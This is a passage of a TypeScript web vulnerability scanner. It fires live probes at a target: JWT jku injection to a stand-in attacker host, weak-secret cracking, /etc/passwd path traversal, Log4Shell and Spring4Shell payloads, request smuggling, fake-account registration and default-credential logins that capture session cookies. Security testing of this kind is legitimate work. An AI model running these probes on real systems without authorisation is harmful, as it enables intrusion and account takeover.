      if (jwksR?.status === 200 && jwksR.body.includes('"keys"')) {
        findings.push({
          title: 'JWKS Endpoint Exposed — Public Key Available',
          severity: 'high',
          verification: 'suspected',
          confidence: 65,
          cvss: 8.1,
          cve: null,
          description: `JWKS endpoint at ${jwksUrl} is publicly accessible.`,
          evidence: `JWKS endpoint: ${jwksUrl}\nHTTP ${jwksR.status}`,
          remediation: 'Explicitly set expected algorithm to RS256 and reject HS256 signed tokens.',
        });
        break;
      }
    }
  }

  // JKU injection
  const injectedJkuToken = `${parts[0].replace(/^([^.]+)/, () => {
    const hdr = { ...header, jku: 'https://attacker.sentinelx-test.invalid/jwks.json' };
    return Buffer.from(JSON.stringify(hdr)).toString('base64url');
  })}.${parts[1]}.${parts[2]}`;
  const jkuR = await probe(target.url, {
    headers: { Authorization: `Bearer ${injectedJkuToken}` },
    timeoutMs: 6_000,
    skipAuth: true,
  });
  if (jkuR?.status === 200) {
    findings.push({
      title: 'JWT JKU Header Injection Accepted',
      severity: 'critical',
      verification: 'suspected',
      confidence: 65,
      cvss: 9.8,
      cve: null,
      description: "Server accepted a JWT with a modified 'jku' header.",
      evidence: `Modified JWT with jku sent to: ${target.url}\nHTTP ${jkuR.status}`,
      remediation: 'Never fetch JWKS from token header.',
    });
  }

  return findings;
}

export async function checkJwtWeaknesses(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking JWT exposure and algorithm weaknesses...`);
  const JWT_REGEX = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
  const endpoints = [
    target.url,
    `${target.url}api/login`,
    `${target.url}api/auth`,
    `${target.url}auth`,
    `${target.url}login`,
  ];
  for (const ep of endpoints.slice(0, 4)) {
    const r = await probe(ep, { timeoutMs: 8_000 });
    if (!r) continue;
    const allText = r.body + '\n' + JSON.stringify(r.headers);
    const tokens = allText.match(JWT_REGEX);
    if (!tokens?.length) continue;
    const token = tokens[0]!;
    const parts = token.split('.');
    if (parts.length !== 3) continue;
    const header = decodeJwtPart(parts[0]!);
    const payload = decodeJwtPart(parts[1]!);
    if (!header) continue;
    const alg = String(header.alg ?? '').toUpperCase();
    await onLog(`[${ts()}] JWT detected at ${ep} — alg: ${alg}`);

    if (alg === 'NONE' || alg === '') {
      findings.push({
        title: "JWT Algorithm 'none' — Complete Authentication Bypass",
        severity: 'critical',
        verification: 'verified',
        confidence: 99,
        cvss: 10.0,
        cve: null,
        description: "JWT with algorithm 'none' found.",
        evidence: `Endpoint: ${ep}\nJWT header: ${JSON.stringify(header)}`,
        remediation: 'Reject any JWT with alg:none.',
      });
      await onLog(`[${ts()}] ⚠ JWT ALG:NONE`);
    } else if (alg === 'HS256' || alg === 'HS384' || alg === 'HS512') {
      const { createHmac } = await import('node:crypto');
      for (const secret of JWT_WEAK_SECRETS) {
        try {
          const sig = createHmac(
            alg === 'HS512' ? 'sha512' : alg === 'HS384' ? 'sha384' : 'sha256',
            secret,
          )
            .update(`${parts[0]}.${parts[1]}`)
            .digest('base64url');
          if (sig === parts[2]) {
            findings.push({
              title: 'JWT HS256 Weak Secret Cracked',
              severity: 'critical',
              verification: 'verified',
              confidence: 99,
              cvss: 9.8,
              cve: null,
              description: `The JWT is signed with weak secret "${secret}".`,
              evidence: `JWT from: ${ep}\nAlgorithm: ${alg}\nCracked secret: "${secret}"`,
              remediation: 'Replace JWT secret with cryptographically random data.',
            });
            await onLog(`[${ts()}] ⚠ JWT SECRET CRACKED: "${secret}"`);
            break;
          }
        } catch {}
      }
    }
    if (payload && !payload.exp) {
      findings.push({
        title: "JWT Missing 'exp' Claim",
        severity: 'high',
        verification: 'verified',
        confidence: 95,
        cvss: 7.5,
        cve: null,
        description: 'JWT has no expiration claim.',
        evidence: `Endpoint: ${ep}\nJWT payload: ${JSON.stringify(payload).slice(0, 300)}`,
        remediation: "Add 'exp' claim to all JWTs.",
      });
      await onLog(`[${ts()}] ⚠ JWT without 'exp' claim`);
    }
    if (payload?.exp) {
      const expTime = Number(payload.exp);
      if (!isNaN(expTime) && expTime < Date.now() / 1000) {
        const expiredR = await probe(target.url, {
          headers: { Authorization: `Bearer ${token}` },
          timeoutMs: 8_000,
          skipAuth: true,
        });
        if (expiredR && expiredR.status === 200) {
          findings.push({
            title: 'Expired JWT Still Accepted by Server',
            severity: 'medium',
            verification: 'suspected',
            confidence: 60,
            cvss: 5.3,
            cve: null,
            description: 'Expired JWT accepted.',
            evidence: `Expired JWT sent to: ${target.url}\nHTTP ${expiredR.status}`,
            remediation: "Validate the 'exp' claim on every request.",
          });
          await onLog(`[${ts()}] ⚠ EXPIRED JWT ACCEPTED`);
        }
      }
    }
    findings.push(...(await checkJwtAdvanced(target, token, parts, header, ep, onLog)));
    break;
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PATH TRAVERSAL
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkPathTraversal(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing path traversal...`);
  const TRAVERSAL_PAYLOADS = [
    '../../../../etc/passwd',
    '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    '..\\..\\..\\..\\windows\\win.ini',
    '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
  ];
  const TRAVERSAL_PARAMS = [
    'file',
    'path',
    'page',
    'include',
    'doc',
    'template',
    'filename',
    'load',
    'read',
    'view',
    'download',
  ];
  const LINUX_PASSWD = /root:.*:0:0:|daemon:.*:1:1:|nobody:.*:99:/;
  const WINDOWS_INI = /\[fonts\]|\[extensions\]|\[boot loader\]/i;
  for (const param of TRAVERSAL_PARAMS.slice(0, 8)) {
    for (const payload of TRAVERSAL_PAYLOADS) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${payload}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      if (LINUX_PASSWD.test(r.body) || WINDOWS_INI.test(r.body)) {
        const label = LINUX_PASSWD.test(r.body) ? '/etc/passwd' : 'windows\\win.ini';
        findings.push({
          title: `Path Traversal Confirmed — Arbitrary File Read (${label})`,
          severity: 'critical',
          verification: 'verified',
          confidence: 99,
          cvss: 9.1,
          cve: null,
          description: `Path traversal via '${param}' confirmed.`,
          evidence: `PROBE: ${probeUrl}\nPAYLOAD: ${param}=${payload}\nHTTP ${r.status}\n${label} content confirmed`,
          remediation: 'Never use user input to construct file paths.',
        });
        await onLog(`[${ts()}] ⚠ PATH TRAVERSAL CONFIRMED`);
        return findings;
      }
    }
  }
  await onLog(`[${ts()}] Path traversal: no file read confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// LOG4SHELL / SPRING4SHELL SURFACE DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkLog4ShellSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Log4Shell/Spring4Shell surface...`);
  const marker = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;
  const log4jPayload = `\${jndi:dns://${marker}.sentinel-test.invalid/a}`;
  const JAVA_ERROR =
    /java\.lang\.|org\.apache\.log4j|javax\.naming\.|classnotfoundexception|log4j|jndi lookup/i;
  for (const [url, headers, location] of [
    [target.url, { 'User-Agent': log4jPayload }, 'User-Agent'],
    [target.url, { 'X-Forwarded-For': log4jPayload }, 'X-Forwarded-For'],
  ] as [string, Record<string, string>, string][]) {
    const r = await probe(url, { headers, timeoutMs: 10_000 });
    if (r && JAVA_ERROR.test(r.body)) {
      findings.push({
        title: 'Log4Shell Attack Surface — Java Error Signal',
        severity: 'critical',
        verification: 'suspected',
        confidence: 72,
        cvss: 10.0,
        cve: 'CVE-2021-44228',
        description: `Log4Shell JNDI payload via ${location} triggered a Java error.`,
        evidence: `Payload injected in: ${location}\nHTTP ${r.status}\nJava/Log4j reference in response`,
        remediation: 'Upgrade Log4j to ≥2.17.1 immediately.',
      });
      break;
    }
  }
  // Spring4Shell surface
  const springR = await probe(target.url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=sentinelx',
    timeoutMs: 8_000,
  });
  if (
    springR &&
    (springR.body.toLowerCase().includes('classloader') ||
      springR.body.toLowerCase().includes('spring'))
  ) {
    findings.push({
      title: 'Spring4Shell Attack Surface Detected',
      severity: 'critical',
      verification: 'suspected',
      confidence: 65,
      cvss: 9.8,
      cve: 'CVE-2022-22965',
      description: 'Spring class loader manipulation pattern referenced.',
      evidence: `POST ${target.url}\nHTTP ${springR.status}`,
      remediation: 'Update Spring Framework to 5.3.18+.',
    });
  }
  await onLog(`[${ts()}] Log4Shell/Spring4Shell surface check complete`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RATE LIMITING ABSENCE
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkRateLimiting(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking for rate limiting...`);
  const authEndpoints = [`${target.url}login`, `${target.url}api/login`, `${target.url}auth/login`];
  for (const ep of authEndpoints) {
    const first = await probe(ep, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'ratelimit@test.example', password: 'wrongpass0' }),
      timeoutMs: 6_000,
    });
    if (!first || first.status === 404) continue;
    const responses: number[] = [first.status];
    for (let i = 1; i <= 9; i++) {
      const r = await probe(ep, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'ratelimit@test.example', password: `wrongpass${i}` }),
        timeoutMs: 6_000,
      });
      if (r) responses.push(r.status);
    }
    if (responses.length >= 8 && !responses.some((s) => s === 429 || s === 423 || s === 403)) {
      findings.push({
        title: `No Rate Limiting on Auth Endpoint — Brute-Force Possible (${ep})`,
        severity: 'high',
        verification: 'verified',
        confidence: 85,
        cvss: 7.5,
        cve: null,
        description: `Endpoint ${ep} accepted 10 rapid login attempts without rate limiting.`,
        evidence: `10 rapid POST requests to ${ep}\nAll response codes: ${responses.join(', ')}`,
        remediation: 'Implement rate limiting.',
      });
      await onLog(`[${ts()}] ⚠ NO RATE LIMITING on ${ep}`);
      break;
    }
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 18: ACCESS CONTROL / IDOR DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkIdorAndBola(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] [Phase 18] Access Control / IDOR...`);
  const r = await probe(target.url, { timeoutMs: 10_000 });
  if (!r) return findings;

  // Role-escalation headers
  const escalationHeaders = [{ 'X-Admin': 'true' }, { 'X-Role': 'admin' }, { Role: 'admin' }];
  for (const hdrs of escalationHeaders) {
    const escalatedR = await probe(target.url, { headers: hdrs, timeoutMs: 8_000 });
    if (escalatedR && r.status !== escalatedR.status && escalatedR.status === 200) {
      const hdrKey = Object.keys(hdrs)[0]!;
      findings.push({
        title: `Privilege Escalation Signal via ${hdrKey} Header`,
        severity: 'high',
        verification: 'suspected',
        confidence: 65,
        cvss: 8.1,
        cve: null,
        description: `Adding ${hdrKey}: ${Object.values(hdrs)[0]} changed response status from ${r.status} to 200.`,
        evidence: `Baseline: HTTP ${r.status}\nWith ${hdrKey}: HTTP ${escalatedR.status}`,
        remediation: 'Never trust role headers from clients.',
      });
      break;
    }
  }

  // Numeric ID extraction and IDOR probing
  const numericIds = [
    ...new Set([
      ...[
        ...r.body.matchAll(
          /"(?:id|userId|user_id|orderId|order_id|documentId|doc_id|itemId|item_id)"\s*:\s*(\d+)/gi,
        ),
      ].map((m) => parseInt(m[1]!)),
      ...[...r.body.matchAll(/\bid=(\d+)\b/gi)].map((m) => parseInt(m[1]!)),
    ]),
  ]
    .filter((id) => id > 0 && id < 1_000_000)
    .slice(0, 5);

  if (numericIds.length > 0) {
    await onLog(`[${ts()}] IDOR: found ${numericIds.length} numeric ID(s)`);
    for (const id of numericIds.slice(0, 3)) {
      const nextId = id + 1;
      const idPaths = [
        `${target.url}api/users/${nextId}`,
        `${target.url}api/orders/${nextId}`,
        `${target.url}?id=${nextId}`,
      ];
      for (const idUrl of idPaths.slice(0, 2)) {
        const origR = await probe(`${target.url}api/users/${id}`, { timeoutMs: 8_000 });
        const nextR = await probe(idUrl, { timeoutMs: 8_000 });
        if (
          origR &&
          nextR &&
          origR.status === 200 &&
          nextR.status === 200 &&
          Math.abs(nextR.body.length - origR.body.length) / origR.body.length > 0.2
        ) {
          findings.push({
            title: 'Potential IDOR — Incremented Object ID Returns Different Data',
            severity: 'medium',
            verification: 'suspected',
            confidence: 55,
            cvss: 6.5,
            cve: null,
            description: `Accessing object ID ${nextId} returned different data.`,
            evidence: `Original: ${origR.body.length} bytes\nIncremented: ${nextR.body.length} bytes`,
            remediation: 'Implement object-level authorisation checks.',
          });
          break;
        }
      }
    }
  }
  await onLog(`[${ts()}] IDOR check complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 19: HTTP REQUEST SMUGGLING (improved)
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkHttpRequestSmuggling(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] [Phase 19] HTTP Request Smuggling...`);
  if (!activeProbesAllowed()) return findings;
  const baselineStart = Date.now();
  const baselineR = await probe(target.url, { timeoutMs: 6_000 });
  const baselineMs = Date.now() - baselineStart;
  if (!baselineR || baselineMs > 500 || baselineR.status < 200 || baselineR.status >= 400) {
    await onLog(
      `[${ts()}] Smuggling: baseline unsuitable (HTTP ${baselineR?.status}, ${baselineMs}ms) — skipping`,
    );
    return findings;
  }

  const smugglingPayloads = [
    {
      label: 'CL.TE smuggling probe',
      raw: [
        `POST / HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX`,
      ].join('\r\n'),
    },
    {
      label: 'TE.CL smuggling probe',
      raw: [
        `POST / HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n`,
      ].join('\r\n'),
    },
  ];

  const { default: http } = await import('node:http');
  const { default: https } = await import('node:https');
  const u = new URL(target.url);
  const transport = u.protocol === 'https:' ? https : http;

  for (const { label, raw } of smugglingPayloads) {
    if (!activeProbesAllowed() || !reserveScanRequest()) break;
    const result = await new Promise<{ status: number | null; durationMs: number }>((resolve) => {
      const t0 = Date.now();
      const socket =
        u.protocol === 'https:'
          ? tls.connect({
              host: u.hostname,
              port: parseInt(u.port) || 443,
              rejectUnauthorized: false,
            })
          : net.connect({ host: u.hostname, port: parseInt(u.port) || 80 });
      let received = '';
      socket.once(u.protocol === 'https:' ? 'secureConnect' : 'connect', () => socket.write(raw));
      socket.on('data', (d) => {
        received += d.toString();
      });
      socket.setTimeout(6000, () => {
        resolve({ status: null, durationMs: Date.now() - t0 });
        socket.destroy();
      });
      socket.on('end', () => {
        const statusMatch = received.match(/^HTTP\/[\d.]+ (\d+)/);
        resolve({
          status: statusMatch ? parseInt(statusMatch[1]!, 10) : null,
          durationMs: Date.now() - t0,
        });
        socket.destroy();
      });
      socket.on('error', () => {
        resolve({ status: null, durationMs: Date.now() - t0 });
      });
    });
    if (
      result.status &&
      result.status !== baselineR.status &&
      result.durationMs > baselineMs + 2000
    ) {
      findings.push({
        title: `Potential HTTP Request Smuggling — ${label}`,
        severity: 'critical',
        verification: 'suspected',
        confidence: 55,
        cvss: 9.8,
        cve: null,
        description: `Ambiguous request produced anomalous response (${result.status}, ${result.durationMs}ms vs baseline ${baselineR.status}, ${baselineMs}ms).`,
        evidence: `Baseline: GET ${target.url} → HTTP ${baselineR.status} (${baselineMs}ms)\n${label}: POST → HTTP ${result.status} (${result.durationMs}ms)`,
        remediation: 'Normalise all requests at the load balancer.',
      });
      await onLog(`[${ts()}] ⚠ HTTP SMUGGLING SIGNAL: ${label}`);
      break;
    }
  }
  await onLog(`[${ts()}] HTTP request smuggling check complete`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMPLIANCE MAPPING HELPER
// ═══════════════════════════════════════════════════════════════════════════════

const COMPLIANCE_MAP: Array<{
  pattern: RegExp;
  owasp?: string[];
  pci?: string[];
  nist?: string[];
}> = [
  { pattern: /SQL injection|SQLi/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /XSS|Cross.Site Scripting/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /SSTI|Template Injection/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /Command Injection|OS Command/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /Path Traversal/i, owasp: ['A01'], pci: ['6.2.4'], nist: ['AC-3'] },
  { pattern: /JWT/i, owasp: ['A02'], pci: ['8.2.2'], nist: ['IA-5'] },
  { pattern: /CORS/i, owasp: ['A05'], pci: ['6.2.4'], nist: ['AC-4'] },
  { pattern: /Rate Limit/i, owasp: ['A07'], pci: ['8.3.4'], nist: ['AC-7'] },
  { pattern: /TLS|SSL|Certificate/i, owasp: ['A02'], pci: ['4.2.1'], nist: ['SC-8'] },
  { pattern: /NoSQL Injection/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /Subdomain Takeover/i, owasp: ['A05'], pci: ['11.4.5'], nist: ['CM-6'] },
  { pattern: /Exposed.*Port|Dangerous.*Service/i, owasp: ['A05'], pci: ['1.3.2'], nist: ['CM-7'] },
  { pattern: /IDOR|Broken Object|Access Control/i, owasp: ['A01'], pci: ['7.2.2'], nist: ['AC-3'] },
  { pattern: /Deserialization/i, owasp: ['A08'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /Log4Shell|Spring4Shell/i, owasp: ['A06'], pci: ['6.3.3'], nist: ['SI-2'] },
  { pattern: /CVE|Vulnerable Version/i, owasp: ['A06'], pci: ['6.3.3'], nist: ['SI-2'] },
  {
    pattern: /Password|Credential|Secret|API Key/i,
    owasp: ['A02'],
    pci: ['8.3.1'],
    nist: ['IA-5'],
  },
  { pattern: /Host Header Injection/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /CRLF|Response Splitting/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SI-10'] },
  { pattern: /Request Smuggling/i, owasp: ['A03'], pci: ['6.2.4'], nist: ['SC-5'] },
  { pattern: /SPF|DMARC|Email/i, owasp: ['A05'], pci: ['5.3.1'], nist: ['SC-5'] },
  {
    pattern: /Information Disclosure|Stack Trace|Version Disclosed/i,
    owasp: ['A05'],
    pci: ['6.2.4'],
    nist: ['SI-12'],
  },
  { pattern: /Clickjacking|X-Frame/i, owasp: ['A04'], pci: ['6.2.4'], nist: ['AC-4'] },
  { pattern: /WAF Bypass/i, owasp: ['A05'], pci: ['6.4.1'], nist: ['SC-7'] },
];

function applyComplianceMapping(findings: RealFinding[]): void {
  for (const finding of findings) {
    for (const rule of COMPLIANCE_MAP) {
      if (rule.pattern.test(finding.title) || rule.pattern.test(finding.description ?? '')) {
        finding.compliance = { owasp: rule.owasp, pci: rule.pci, nist: rule.nist };
        break;
      }
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEAPONISED PHASES 24–28 (FULL IMPLEMENTATIONS)
// ═══════════════════════════════════════════════════════════════════════════════

function extractSessionCookie(setCookieHeader: string): string | null {
  const m = setCookieHeader.match(
    /(?:^|,)\s*((?:PHPSESSID|JSESSIONID|session|sess|sid|auth|token|user_session|_session|access_token)[^;,]*)/i,
  );
  return m ? m[1].trim() : null;
}

function hasAuthenticatedContent(body: string, finalUrl: string): boolean {
  const b = body.toLowerCase();
  return (
    [
      'log out',
      'logout',
      'sign out',
      'signout',
      'dashboard',
      'my account',
      'my profile',
      'welcome',
      'account settings',
    ].some((s) => b.includes(s)) ||
    ['dashboard', 'account', 'profile', 'home', 'welcome'].some((s) =>
      finalUrl.toLowerCase().includes(s),
    )
  );
}

function buildRegistrationBody(
  hiddenInputs: Record<string, string>,
  csrfToken: string | null,
  fakeData: Record<string, string>,
): string {
  const fields: Record<string, string> = {
    ...hiddenInputs,
    email: fakeData.email!,
    username: fakeData.username!,
    user: fakeData.username!,
    password: fakeData.password!,
    password_confirmation: fakeData.password!,
    confirm_password: fakeData.password!,
    password2: fakeData.password!,
    first_name: fakeData.firstName!,
    last_name: fakeData.lastName!,
    firstname: fakeData.firstName!,
    lastname: fakeData.lastName!,
    name: fakeData.name!,
    company: fakeData.company!,
    phone: fakeData.phone!,
    address: fakeData.address!,
    city: fakeData.city!,
    zip: fakeData.zip!,
    country: fakeData.country!,
  };
  if (csrfToken) {
    fields['_token'] = csrfToken;
    fields['csrf_token'] = csrfToken;
    fields['authenticity_token'] = csrfToken;
  }
  return Object.entries(fields)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join('&');
}

async function checkOpenRegistration(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 24] Testing open registration...`);
  const regPaths = [
    '/register',
    '/signup',
    '/sign-up',
    '/account/register',
    '/user/register',
    '/users/register',
    '/create-account',
  ];
  const rand = Math.random().toString(36).slice(2, 8);
  const fakeData: Record<string, string> = {
    email: `sentinelx${rand}@test.com`,
    username: `sentinel${rand}`,
    password: `SentX${rand}!@#`,
    firstName: 'Sentinel',
    lastName: 'XTest',
    name: `Sentinel ${rand}`,
    company: `TestCorp${rand}`,
    phone: `+1555${Math.floor(1_000_000 + Math.random() * 9_000_000)}`,
    address: '123 Test Street',
    city: 'Testville',
    zip: '10001',
    country: 'US',
  };

  for (const regPath of regPaths.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const regUrl = target.url.replace(/\/$/, '') + regPath;
    const pageRes = await probe(regUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404 || pageRes.status === 410) continue;
    const hasForm = /<form[^>]*>/i.test(pageRes.body);
    const hasPasswordField = /type=['"]?password['"]?/i.test(pageRes.body);
    const hasEmailField = /type=['"]?email['"]?|name=['"]?email['"]?/i.test(pageRes.body);
    if (!hasForm || (!hasPasswordField && !hasEmailField)) continue;

    await onLog(
      `[${ts()}] [Phase 24] Registration form at ${regUrl} — submitting fake identity...`,
    );
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /input[^>]+type=['"]?hidden['"]?[^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(pageRes.body)) !== null) {
      const nm = hm[0].match(/name=['"]([^'"]+)['"]/i);
      const vm = hm[0].match(/value=['"]([^'"]*)['"]/i);
      if (nm && vm) hiddenInputs[nm[1]] = vm[1];
    }
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    const submitRes = await probe(regUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Referer: regUrl,
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
      },
      body: buildRegistrationBody(hiddenInputs, csrfToken, fakeData),
      timeoutMs: 12_000,
      followRedirects: true,
    });
    if (!submitRes) continue;

    const sessionCookie = extractSessionCookie(submitRes.headers['set-cookie'] ?? '');
    const authenticated = hasAuthenticatedContent(submitRes.body, submitRes.finalUrl);
    if (sessionCookie && authenticated) {
      const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
      storeCapturedSession(sessionCookie);
      findings.push({
        title: 'Unauthorized Account Creation via Open Registration — Full Dashboard Access',
        severity: 'critical',
        verification: 'verified',
        confidence: 90,
        cvss: 8.5,
        cve: null,
        description: `An account was automatically created at ${regUrl} without verification.`,
        evidence: `REGISTRATION URL: ${regUrl}\nEMAIL USED: ${fakeData.email}\nHTTP RESPONSE: ${submitRes.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${['log out', 'logout', 'dashboard', 'account', 'welcome'].filter((s) => submitRes.body.toLowerCase().includes(s)).join(', ') || 'redirect to authenticated URL'}`,
        remediation: 'Require email verification, CAPTCHA, or manual approval.',
      });
      await onLog(
        `[${ts()}] ⚠ CRITICAL: Open registration at ${regUrl} — session captured (${masked})`,
      );
      return findings;
    }
    const bodyLower = submitRes.body.toLowerCase();
    if (
      bodyLower.includes('captcha') ||
      bodyLower.includes('verify your email') ||
      bodyLower.includes('confirmation email')
    ) {
      findings.push({
        title: 'Registration Form Present but Protected',
        severity: 'low',
        verification: 'informational',
        confidence: 30,
        cvss: 0,
        cve: null,
        description: `Registration form at ${regUrl} is gated by CAPTCHA/email verification.`,
        evidence: `POST ${regUrl} → HTTP ${submitRes.status}`,
        remediation: 'Ensure server-side enforcement.',
      });
      await onLog(`[${ts()}] [Phase 24] Registration form at ${regUrl} is gated`);
      return findings;
    }
  }
  await onLog(`[${ts()}] [Phase 24] No open registration endpoint found`);
  return findings;
}

const DEFAULT_CREDENTIALS: [string, string][] = [
  ['admin', 'admin'],
  ['admin', 'password'],
  ['admin', 'admin123'],
  ['admin', '1234'],
  ['admin', '123456'],
  ['admin', 'password123'],
  ['admin', 'admin@123'],
  ['admin', 'Admin1234!'],
  ['administrator', 'admin'],
  ['administrator', 'password'],
  ['root', 'root'],
  ['root', 'toor'],
  ['root', 'password'],
  ['user', 'user'],
  ['user', 'password'],
  ['test', 'test'],
  ['guest', 'guest'],
  ['demo', 'demo'],
  ['support', 'support'],
  ['manager', 'manager'],
];

async function checkDefaultCredentials(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 25] Testing default credentials...`);
  const loginPaths = [
    '/rest/Session/login',
    '/login',
    '/signin',
    '/sign-in',
    '/admin/login',
    '/admin',
    '/user/login',
    '/auth/login',
    '/api/login',
    '/api/auth',
  ];
  const FAIL_SIGNALS = [
    'invalid',
    'incorrect',
    'error',
    'failed',
    'wrong',
    'denied',
    'unauthorized',
  ];

  for (const loginPath of loginPaths.slice(0, 5)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, '') + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;
    const hasLoginForm =
      /<form[^>]*>/i.test(pageRes.body) && /type=['"]?password['"]?/i.test(pageRes.body);
    if (!hasLoginForm) continue;

    await onLog(
      `[${ts()}] [Phase 25] Login form at ${loginUrl} — testing ${DEFAULT_CREDENTIALS.length} pairs...`,
    );
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    let attempts = 0;
    for (const [username, password] of DEFAULT_CREDENTIALS) {
      if (!activeProbesAllowed() || attempts >= 20) break;
      attempts++;
      const fields: Record<string, string> = {
        username,
        user: username,
        email: username,
        login: username,
        password,
        pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');

      const r = await probe(loginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: loginUrl,
          ...(cookieHeader ? { Cookie: cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers['set-cookie'] ?? '');
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasLoginForm2 = /<form[^>]*>/i.test(r.body) && /type=['"]?password['"]?/i.test(r.body);
      const hasAuth = ['log out', 'logout', 'dashboard', 'account', 'welcome', 'profile'].some(
        (s) => bodyLower.includes(s),
      );

      if (sessionCookie && !hasFail && !hasLoginForm2 && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: `Default Credentials — ${username}:${password} Grants Full Access`,
          severity: 'critical',
          verification: 'verified',
          confidence: 95,
          cvss: 9.8,
          cve: null,
          description: `The login endpoint at ${loginUrl} accepted default credentials (${username}:${password}).`,
